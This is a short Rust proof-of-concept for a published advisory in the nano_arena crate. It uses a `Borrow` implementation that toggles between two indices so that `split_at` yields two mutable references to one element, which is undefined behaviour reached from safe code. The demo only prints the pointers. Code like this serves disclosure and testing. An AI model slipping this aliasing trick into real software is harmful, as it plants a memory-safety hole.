//! UB demo for nano_arena ≤ 0.5.1  (CVE-2021-28032 / RUSTSEC-2021-0031)
//
// `Arena::split_at` used to call `selected.borrow()` twice.  By giving it an
// attacker-controlled type whose `Borrow` implementation alternates between two
// different indices we can obtain *two mutable references to the same element*,
// violating Rust’s aliasing guarantees.

#![forbid(unsafe_code)]

use nano_arena::{Arena, Idx};
use std::{borrow::Borrow, cell::Cell};

/// An index whose `borrow()` toggles between two real indices.
struct ToggleIdx {
    first: Idx,
    second: Idx,
    state: Cell<bool>,
}

impl Borrow<Idx> for ToggleIdx {
    fn borrow(&self) -> &Idx {
        self.state.set(!self.state.get());
        if self.state.get() { &self.first } else { &self.second }
    }
}

fn main() {
    let mut arena = Arena::new();
    let idx1 = arena.alloc(10);
    let idx2 = arena.alloc(20);

    let trick = ToggleIdx { first: idx1.clone(), second: idx2.clone(), state: Cell::new(false) };

    // --- trigger the old bug -------------------------------------------------
    let (mref_one, mut split) = arena.split_at(trick).unwrap();
    let mref_two = split.get_mut(&idx1).unwrap();   // UB: second &mut to the same spot!

    println!("ptr #1 = {mref_one:p}");
    println!("ptr #2 = {mref_two:p}");
}
